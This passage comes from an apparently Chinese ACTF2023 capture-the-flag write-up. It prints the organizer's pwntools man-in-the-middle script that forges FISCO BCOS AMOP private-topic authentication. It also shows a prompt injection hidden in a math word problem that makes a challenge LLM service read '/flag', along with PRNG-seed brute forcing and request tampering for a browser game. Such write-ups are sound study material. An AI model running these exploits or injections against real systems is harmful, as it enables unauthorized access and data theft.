<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -cp &#x27;conf/:lib/*:apps/*&#x27; org.fisco.bcos.sdk.demo.amop.tool.AmopSubscriber &#x27;flag1&#x27;</span><br><span class="line"></span><br><span class="line">java -cp &#x27;conf/:lib/*:apps/*&#x27; org.fisco.bcos.sdk.demo.amop.tool.AmopSubscriberPrivateByKey subscribe &#x27;flag2&#x27; conf/amop/privkey</span><br></pre></td></tr></table></figure>

<p><img src="https://img.seaeye.cn/img/ACTF2023/12.png" alt="12">​</p>
<p><img src="https://img.seaeye.cn/img/ACTF2023/13.png" alt="13">​</p>
<p><strong>拼接后得到****完整flag</strong>为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACTF&#123;Con5oR7ium_B1ock_cHAiN_sO_INterESt1NG&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="amop2-fei-yu-qi-wei-zheng-que-jie-chu">AMOP2(非预期 未正确解出)</span><a href="#amop2-fei-yu-qi-wei-zheng-que-jie-chu" class="header-anchor"></a></h3><p>题目描述</p>
<p><img src="https://img.seaeye.cn/img/ACTF2023/14.png" alt="14">​</p>
<p><img src="https://img.seaeye.cn/img/ACTF2023/15.png" alt="15">​</p>
<p><a href="https://img.seaeye.cn/file/ACTF2023/AMOP2.zip">题目附件</a></p>
<p>解题思路</p>
<p><strong>这题在第一题的基础上增加了难度，虽然研究了很久，但由于是初识****FISCO BCOS</strong>，对底层原理等深入的内容并不了解，没有正常解出。但推测大致思路是基于<a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">中间人攻击 MITM</a>，自行搭建一个中间节点，与题目节点互相建立<code>P2P连接</code>​，同时加入联盟链成为<code>观察者节点 Observer</code>​，由于<code>AMOP</code>​协议会将消息也同步发送给<code>观察者节点</code>​，由于消息本身未进行加密，只是多加了一层身份验证，那么这样我们自己的中间节点便可以捕获到<code>消息发送者 Publisher</code>​通过<code>AMOP</code>​协议发送到<code>私有频道</code>​的消息原文，可以借助它完成或绕过身份验证并读到<strong>flag</strong>消息。</p>
<p><a href="https://fisco-bcos-doc.readthedocs.io/zh-cn/latest/docs/design/amop_protocol.html">链上信息传输协议文档</a>：</p>
<p><img src="https://img.seaeye.cn/img/ACTF2023/16.png" alt="16">​</p>
<p><img src="https://img.seaeye.cn/img/ACTF2023/17.png" alt="17">​</p>
<p><strong>（以上是比赛时的非预期解结果，我意外解出的原因大概是在我订阅消息的同时出题人恰好运行了他的</strong>​<code>solve</code>​脚本，此时由于证书文件一致或是联盟链身份验证的一些特性，导致我这边也临时通过了身份检验，共享了他的成果，意外地拿到了<strong>flag</strong>，后续本着<strong>实事求是</strong>的比赛精神，经过双方联系达成了<strong>此次非预期作答不计分</strong>的共识。）</p>
<p><strong>以下是出题人赛后提供的</strong>​<code>solve</code>​脚本，本质上是基于文档中<code>私有话题的认证流程</code>​部分内容从<code>网络通信层</code>​进行<code>中间人攻击</code>​，留作参考：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import abc</span><br><span class="line">import socket</span><br><span class="line">import ssl</span><br><span class="line">from ssl import SSLContext</span><br><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line">context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line"></span><br><span class="line"># create SSL context</span><br><span class="line">context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)</span><br><span class="line">context.check_hostname = False</span><br><span class="line">context.load_verify_locations(&quot;./conf/ca.crt&quot;)</span><br><span class="line">context.load_cert_chain(&quot;./conf/sdk.crt&quot;, &quot;./conf/sdk.key&quot;)</span><br><span class="line">context.set_ecdh_curve(&quot;secp256k1&quot;)</span><br><span class="line">context.verify_mode = ssl.CERT_REQUIRED</span><br><span class="line"></span><br><span class="line"># TARGET_IP = &quot;127.0.0.1&quot;</span><br><span class="line">TARGET_IP = &quot;120.46.58.72&quot;</span><br><span class="line"># TARGET_PORT = 20202 # node2</span><br><span class="line">TARGET_PORT = 41202</span><br><span class="line"># TARGET_RPCPORT = 8547</span><br><span class="line">TARGET_RPCPORT = 48547</span><br><span class="line"></span><br><span class="line">PUBLISHER_IP = &quot;127.0.0.1&quot;</span><br><span class="line">PUBLISHER_PORT = 20200  # node1</span><br><span class="line">SUBSCRIBER_IP = &quot;127.0.0.1&quot;</span><br><span class="line">SUBSCRIBER_PORT = 20201</span><br><span class="line"></span><br><span class="line">conn = remote(host=TARGET_IP, port=TARGET_PORT, typ=&quot;tcp&quot;, ssl=True, ssl_context=context, timeout=120)</span><br><span class="line"></span><br><span class="line"># let&#x27;s subscribe a topic here</span><br><span class="line"># which means we need to craft a channel packet</span><br><span class="line"># see class ChannelMessage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def packChannelMsg(type: int, seq: bytes, status: int, payload: bytes):</span><br><span class="line">    # 4 bytes length</span><br><span class="line">    # 2 bytes type</span><br><span class="line">    # 32 bytes seq</span><br><span class="line">    # 4 bytes result</span><br><span class="line">    # then payload</span><br><span class="line">    CHANNEL_HEADER_LENGTH = 42</span><br><span class="line">    result = b&quot;&quot;</span><br><span class="line">    result += p32(CHANNEL_HEADER_LENGTH + len(payload), endian=&quot;big&quot;)</span><br><span class="line">    result += p16(type, endian=&quot;big&quot;)</span><br><span class="line">    result += seq</span><br><span class="line">    result += p32(status, endian=&quot;big&quot;)</span><br><span class="line">    result += payload</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">##</span><br><span class="line"># 1. fake topices</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># AMOP_CLIENT_SUBSCRIBE_TOPICS = 50</span><br><span class="line"># packet = packChannelMsg(50, b&quot;\x00&quot; * 32, 0, b&#x27;[&quot;flag&quot;]&#x27;)</span><br><span class="line"># coool, but careful, this topic will be set VERIFYING_STATUS</span><br><span class="line"># we also set channel here, we can hear the random UUID now</span><br><span class="line">packet = packChannelMsg(50, b&quot;\x00&quot; * 32, 0, b&#x27;[&quot;#!$TopicNeedVerify_flag&quot;,&quot;#!$VerifyChannel_#!$TopicNeedVerify_flag&quot;]&#x27;)</span><br><span class="line">conn.send(packet)</span><br><span class="line"># wait the topic sync</span><br><span class="line">info(&quot;Sleep a while&quot;)</span><br><span class="line">time.sleep(3)</span><br><span class="line"></span><br><span class="line">##</span><br><span class="line"># 2. leak verify</span><br><span class="line">##</span><br><span class="line"># TODO</span><br><span class="line"># can we do this with channel request instead of RPC request</span><br><span class="line"></span><br><span class="line">packet = &#x27;&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;getPeers&quot;,&quot;params&quot;:[1],&quot;id&quot;:1&#125;&#x27;</span><br><span class="line">rpcRes = requests.post(f&quot;http://&#123;TARGET_IP&#125;:&#123;TARGET_RPCPORT&#125;&quot;, data=packet)</span><br><span class="line">rpcRes = rpcRes.text</span><br><span class="line">rpcResDict = json.loads(rpcRes)</span><br><span class="line">hijackTopic = &quot;&quot;</span><br><span class="line">for peer in rpcResDict[&quot;result&quot;]:</span><br><span class="line">    for topic in peer[&quot;Topic&quot;]:</span><br><span class="line">        info(f&quot;iterate &#123;topic&#125;&quot;)</span><br><span class="line">        if topic.startswith(&quot;#!$VerifyChannel_#!$TopicNeedVerify_flag&quot;):</span><br><span class="line">            hijackTopic = topic</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">if not hijackTopic:</span><br><span class="line">    error(&quot;Fail to get topic&quot;)</span><br><span class="line">    exit(1)</span><br><span class="line"></span><br><span class="line">info(f&quot;Cool we get the hijack topic: &#123;hijackTopic&#125;&quot;)</span><br><span class="line"># let&#x27;s get the random UUID here</span><br><span class="line"></span><br><span class="line"># conn.recvuntil(b&quot;#!$VerifyChannel_#!$TopicNeedVerify_flag&quot;, drop=True)</span><br><span class="line"># randomuuid = conn.recv(32)</span><br><span class="line">badTopic = b&quot;#!$VerifyChannel_#!$TopicNeedVerify_flag&quot;</span><br><span class="line">requestPacket_1 = conn.recvuntil(badTopic)</span><br><span class="line">info(f&quot;we receive verify request header &#123;requestPacket_1&#125;&quot;)</span><br><span class="line"></span><br><span class="line">requestPacket_seq = requestPacket_1[-(len(badTopic) + 4 + 1 + 32):-(len(badTopic) + 4 + 1)]</span><br><span class="line">assert (len(requestPacket_seq) == 32)</span><br><span class="line">info(f&quot;we get the seq &#123;requestPacket_seq.hex()&#125;&quot;)</span><br><span class="line">randomuuid = conn.recv(32)  # badTopic[randomuuid_idx:]</span><br><span class="line">info(f&quot;Steal the random number: &#123;randomuuid&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># we need to quickly achieve MITM</span><br><span class="line"># verify_packet = conn.recv()</span><br><span class="line"># info(f&quot;packet with UUID: &#123;verify_packet&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># let&#x27;s send a request to see if we can get the answer for this</span><br><span class="line"># and try to fake the reply</span><br><span class="line"># AMOP_REQUEST = 48</span><br><span class="line">conn_hide = remote(host=TARGET_IP, port=TARGET_PORT, ssl=True, ssl_context=context)</span><br><span class="line">target_topic = hijackTopic.encode()  # to bytes</span><br><span class="line">target_payload = bytes([len(target_topic) + 1]) + target_topic + randomuuid</span><br><span class="line">packet = packChannelMsg(48, b&quot;\x00&quot; * 32, 0, target_payload)</span><br><span class="line">conn_hide.send(packet)</span><br><span class="line"></span><br><span class="line"># what we will receive here ?</span><br><span class="line">reply = conn_hide.recv()</span><br><span class="line">info(f&quot;hide channel receives: &#123;reply&#125;&quot;)</span><br><span class="line"># get the signature here</span><br><span class="line">signature_idx = reply.index(target_topic) + len(target_topic)</span><br><span class="line">signature = reply[signature_idx:]</span><br><span class="line">info(f&quot;hacked signature: &#123;signature.hex()&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># reply</span><br><span class="line"># AMOP_RESPONSE = 0x31</span><br><span class="line"># be careful with the seq blabla</span><br><span class="line">requestPayload = bytes([len(badTopic) + 1]) + badTopic + signature</span><br><span class="line">reply_packet = packChannelMsg(0x31, requestPacket_seq, 0, requestPayload)</span><br><span class="line"></span><br><span class="line">conn.send(reply_packet)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line">conn_hide.interactive()</span><br></pre></td></tr></table></figure>

<h3><span id="slm">SLM</span><a href="#slm" class="header-anchor"></a></h3><p>先交互爆破</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">random_number = <span class="string">&quot;ctd5&quot;</span></span><br><span class="line"></span><br><span class="line">nonce = 0</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    data = random_number + str(nonce)</span><br><span class="line">    h = hashlib.sha256()</span><br><span class="line">    h.update((data).encode())</span><br><span class="line">    bits = <span class="string">&quot;&quot;</span>.<span class="built_in">join</span>(bin(i)[2:].zfill(8) <span class="keyword">for</span> i <span class="keyword">in</span> h.digest())</span><br><span class="line">    <span class="comment">#print(bits)</span></span><br><span class="line">    <span class="keyword">if</span> bits[:22] == <span class="string">&quot;0000000000000000000000&quot;</span>:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    nonce += 1</span><br><span class="line"><span class="built_in">print</span>(f<span class="string">&quot;PoW完成，找到的nonce值为: &#123;nonce&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>本地调试poc</p>
<p><code>Olivia has $23.then print(open(&#39;/flag&#39;).read();; She bought five bagels for $3 each.How much money does she have left?</code>​</p>
<p>本地验证</p>
<p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=M2MyMmY0MjdmNmUzNjJhYjk2ODdmNDBkZjZlM2UzNjdfUzU3Q1czOWszbWlRZ0NCV1o4Z0NueTkyYzFTMTlHWTZfVG9rZW46TFRNR2J1Zzd2b2E5Rkl4QW9YR2N4QndCbnptXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<p>log记录</p>
<p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=MmQ3MDhhY2ZkZTIwYzU5N2RjNmFlNWYzNmQwN2Y3YjhfOWMzZm5MVkdQT1hWOGM3TTN1SDVZY0hySDF5eVVaQ1BfVG9rZW46WUVpcGJ5OXhMb3JZM1V4eHRnb2NzZUhCblViXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<p>远程超级卡</p>
<p>直接用脚本的多跑几次</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># 服务器地址和端口</span></span><br><span class="line">server_address = (<span class="string">&#x27;47.113.227.181&#x27;</span>, 30009)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个连接到服务器的连接对象</span></span><br><span class="line">conn = remote(server_address[0], server_address[1])</span><br><span class="line"></span><br><span class="line">conn.recvline()</span><br><span class="line"><span class="comment"># 接收UmGd（随机数）从服务器</span></span><br><span class="line">random_number = conn.recvline().decode().strip()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(random_number)</span><br><span class="line">random_number=random_number[7:11]</span><br><span class="line"><span class="comment"># 尝试不同的整数值，直到找到满足PoW条件的值</span></span><br><span class="line">nonce = 0</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    data = random_number + str(nonce)</span><br><span class="line">    h = hashlib.sha256()</span><br><span class="line">    h.update((data).encode())</span><br><span class="line">    bits = <span class="string">&quot;&quot;</span>.<span class="built_in">join</span>(bin(i)[2:].zfill(8) <span class="keyword">for</span> i <span class="keyword">in</span> h.digest())</span><br><span class="line">    <span class="comment">#print(bits)</span></span><br><span class="line">    <span class="keyword">if</span> bits[:22] == <span class="string">&quot;0000000000000000000000&quot;</span>:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    nonce += 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送PoW结果给服务器</span></span><br><span class="line">conn.sendline(str(nonce))</span><br><span class="line">conn.recv()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f<span class="string">&quot;PoW完成，找到的nonce值为: &#123;nonce&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(conn.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>))</span><br><span class="line">conn.sendline(<span class="string">&quot;Olivia has <span class="variable">$23</span>.then `print(open(&#x27;/flag&#x27;).read();`; She bought five bagels for <span class="variable">$3</span> each.How much money does she have left?&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(conn.recv())</span><br><span class="line"><span class="built_in">print</span>(conn.recv())</span><br><span class="line"><span class="built_in">print</span>(conn.recv())</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=ODg3MGRiMmU4Mzg3MjNmMzA4NzBmMWQ0ZTEyNTdkNTVfTmd6b3JlUEFvZWJGOWlNRnluWWJmb1VPUkhaejViMDZfVG9rZW46S1J6Y2JnYlFmb3QwNW54MzYyUWNHM3hIbmFjXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<h3><span id="ctfer-simulator">CTFer simulator</span><a href="#ctfer-simulator" class="header-anchor"></a></h3><p>一个用TS(JS)写的在线游戏模拟器</p>
<p><a href="https://github.com/morriswmz/phd-game">https://github.com/morriswmz/phd-game</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (t !== i.EndGameState.None) <span class="keyword">return</span> <span class="built_in">this</span>._gameState.playerInventory.count(<span class="string">&quot;flag&quot;</span>) &gt;= <span class="number">8</span> &amp;&amp; <span class="built_in">this</span>._gameState.tracer.check(), <span class="keyword">void</span>(<span class="keyword">yield</span> <span class="built_in">this</span>.start(t === i.EndGameState.Winning));</span><br></pre></td></tr></table></figure>

<p>只要flag&gt;8游戏就胜利了，正在思考怎么调</p>
<p>可以用代理拦截重写配置文件 增加每次flag获取 但是flag为10的时候结束游戏也没有弹出flag</p>
<p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=OWVmYjExNWIwOTc1YTdiNmE2NWU3OGUzNzMxMjc4MTJfNXVXV09GQ2VhSnBWalNhZUE2UjNWYnhhd0JzTkdBU3VfVG9rZW46WE0yT2JMd29kb3NmVGZ4WWoxWmNXeUNoblZlXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=ODJiNTdkMzcyMjhiYTQ4MzA3NDU1ZDlkZTYwNjcxZWVfazMyV3lzTnVGTE9SR0cyVXRQanU1OHpuTFRmV1FmVTVfVG9rZW46S2JLdWJmTHN3b3puZnh4UU96bGNQN3dsbkNvXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<p>flag数&gt;&#x3D;8后到达获胜条件之后会触发一个check()函数(正常游玩基本上不可能达到8的)：</p>
<p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=NjkxMDlmMTA3MjY2MGY1ZDU3NTc0OTk2NjYzODJmNmZfUTBrVFRsSGlJYVJnSnRuWFpGRzhwbUpTZXVWOVNmakpfVG9rZW46TEttUmJleXJqb1pCS294anQ2SGMwUzVXbkRiXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<p>会构造一个请求向后端发送请求，传输的数据包括随机数种子，随机数以及用户的行为，如果满足条件应该就可以拿到flag了，请求包格式为：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /api/verify HTTP/<span class="number">1.1</span></span><br><span class="line">Host: http:<span class="comment">//120.46.65.156:23000/</span></span><br><span class="line">Referer: http:<span class="comment">//120.46.65.156:23000/static/</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Length: <span class="number">1031</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;randomseed&quot;</span>: <span class="string">&quot;9099412735381858&quot;</span>,</span><br><span class="line">    <span class="string">&quot;randoms&quot;</span>:[<span class="number">0.5140692999120802</span>,<span class="number">0.3860794377978891</span>,<span class="number">0.7347333114594221</span>,<span class="number">0.3968554774764925</span>,<span class="number">0.8094464894384146</span>,<span class="number">0.8490356937982142</span>,<span class="number">0.39441126654855907</span>,<span class="number">0.8459157436154783</span>,<span class="number">0.16993460129015148</span>,<span class="number">0.9875658398959786</span>,<span class="number">0.3602522125001997</span>,<span class="number">0.839919890044257</span>,<span class="number">0.22587694227695465</span>,<span class="number">0.57798264734447</span>,<span class="number">0.1990677216090262</span>,<span class="number">0.022076266119256616</span>,<span class="number">0.04661894147284329</span>,<span class="number">0.8104400581214577</span>,<span class="number">0.5792863611131907</span>,<span class="number">0.9961340674199164</span>,<span class="number">0.03275181073695421</span>,<span class="number">0.9454671153798699</span>,<span class="number">0.8649262373801321</span>,<span class="number">0.9651431469246745</span>,<span class="number">0.8917619856074452</span>,<span class="number">0.4506879821419716</span>,<span class="number">0.047111596213653684</span>,<span class="number">0.14828399359248579</span>,<span class="number">0.5607137372717261</span>,<span class="number">0.452212214237079</span>,<span class="number">0.5840967365074903</span>,<span class="number">0.7207855097949505</span>,<span class="number">0.7038476958405226</span>,<span class="number">0.5140720165800303</span>,<span class="number">0.08320645405910909</span>,<span class="number">0.291031195782125</span>],</span><br><span class="line">    <span class="string">&quot;traces&quot;</span>: [</span><br><span class="line">[<span class="string">&quot;event&quot;</span>,[<span class="string">&quot;flagCheck&quot;</span>,[]]],</span><br><span class="line">[<span class="string">&quot;event&quot;</span>,[<span class="string">&quot;flagCheck&quot;</span>,[]]],</span><br><span class="line">[<span class="string">&quot;event&quot;</span>,[<span class="string">&quot;flagCheck&quot;</span>,[]]],</span><br><span class="line">[<span class="string">&quot;event&quot;</span>,[<span class="string">&quot;flagCheck&quot;</span>,[]]],</span><br><span class="line">[<span class="string">&quot;event&quot;</span>,[<span class="string">&quot;flagCheck&quot;</span>,[]]],</span><br><span class="line">[<span class="string">&quot;event&quot;</span>,[<span class="string">&quot;flagCheck&quot;</span>,[]]],</span><br><span class="line">[<span class="string">&quot;event&quot;</span>,[<span class="string">&quot;flagCheck&quot;</span>,[]]],</span><br><span class="line">[<span class="string">&quot;event&quot;</span>,[<span class="string">&quot;flagCheck&quot;</span>,[]]],</span><br><span class="line">[<span class="string">&quot;event&quot;</span>,[<span class="string">&quot;flagCheck&quot;</span>,[]]]</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在在思考怎么构造</p>
<p>可以用#init_seed&#x3D; 来控制随机数的seed 用的seedrandom的alea方法生成随机数</p>
<p>游戏共48小时 有48次机会</p>
<p>复习使用一次</p>
<p>考试会跳过1h</p>
<p>一次flag流程：</p>
<p>insight-&gt;draft-&gt;tuned-&gt;submit共用4次</p>
<p>每小时降低10点精力</p>
<p>考试额外降10点</p>
<p>提交flag恢复10点</p>
<p>goodinsight恢复10点</p>
<p>可以规划出一个需要最少休息的路线 并控制prng使其实现</p>
<p>写了一个爆破种子的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">var seedrandom = require(<span class="string">&#x27;seedrandom&#x27;</span>);</span><br><span class="line"></span><br><span class="line">var seed = <span class="number">5</span>;</span><br><span class="line">var numberOfTries = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (true) &#123;</span><br><span class="line">    seed++;</span><br><span class="line">    var found = true;</span><br><span class="line">    var random = seedrandom.alea(seed.toString());</span><br><span class="line">    <span class="keyword">for</span> (var i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">        var r = random();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (r &gt;= <span class="number">0.5</span>) &#123;</span><br><span class="line">            found = false;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (found) &#123;</span><br><span class="line">        console.log(`Seed found: $&#123;seed&#125;`);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    numberOfTries++;</span><br><span class="line">    <span class="keyword">if</span> (numberOfTries % <span class="number">100000</span> === <span class="number">0</span>) &#123;</span><br><span class="line">        console.log(`Tried $&#123;numberOfTries&#125; seeds...`);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>30个0.6以下的随机数:3830475</p>
<p>35个0.6以下的seed #init_seed&#x3D;44702381 用这个随便打了一下 能打到7个flag 我觉得这个种子优化一下操作肯定能出</p>
<p>唉 傻逼了 改获取flag没法通过校验但是可以改用户的体力</p>
<p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=ODZmYWViMGI2Nzc1OTA5ODljMGQxNDIwYTlkODVmNjZfSUxMWE9MTnhUMnhKT0xWbGJtcFd4ZHpwTmZHcGJVRWxfVG9rZW46V1luYWJ5bWlib0x3NEl4Y0FJR2NuOUtMbk04XzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<p>把这个events.yaml的返回包抓了，这个是配置文件，改成：</p>
